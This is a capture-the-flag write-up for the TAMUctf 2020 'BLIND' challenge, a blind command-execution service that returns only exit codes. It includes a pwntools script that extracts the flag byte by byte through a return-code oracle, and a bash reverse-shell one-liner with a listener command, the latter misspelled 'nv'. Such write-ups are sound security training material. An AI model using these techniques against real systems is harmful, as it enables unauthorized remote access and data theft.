# BLIND Writeup

### TAMUctf 2020 - Misc 50

> `nc challenges.tamuctf.com 3424`

#### Observations

I first encounter shell-like interface, which first prints `Execute :`. When I input random shell commands, It returns integer. I assumed that the integer response is a return code of shell command. To make the assumption solid, I ran `cat flag*` and found out the response code is `0`, which meant the command had successfully executed. I have solved by two methods.

#### Method 1: Bruteforce each byte

By using the oracle, we can bruteforce the flag value by each chars. By observing the return code of command `cat flag * | grep -F [flag_candidate]`, I could get the flag value byte by byte. Below is the [source code](solve.py).

```python
#!/usr/bin/env python3
import pwn
from string import printable

# pwn.context.log_level = 'DEBUG'

IP, PORT = 'challenges.tamuctf.com', 3424
p = pwn.remote(IP, PORT)

def execute(payload):
    p.sendlineafter('Execute: ', payload)
    return int(p.recvline(keepends=False))


flag = 'gigem{'
for _ in range(30):
    for char in printable:
        if char in ['\\']:
            continue
        flag_cand = flag + char
        ret = execute('cat flag* | grep -F {}'.format('"{}"'.format(flag_cand)))
        if ret == 0:
            flag = flag_cand
            pwn.log.info(flag)
            if char == '}':
                assert flag == 'gigem{r3v3r53_5h3ll5}'
                pwn.log.success('flag = {}'.format(flag))
                exit()
            break
```

#### Method 2: Reverse Shell

After I obtained flag by using method 1, flag content told me there was much more simple solution. Just open reverse shell, assuming the system executes arbitrary command!

Input below command to blind shell.

```sh
/bin/bash -i >& /dev/tcp/[IP]/[PORT] 0>&1
```

Now listen from your server.

```sh
nv -lvp [PORT]
```

Get reverse shell and profit. Here is the flag:

```
gigem{r3v3r53_5h3ll5}
```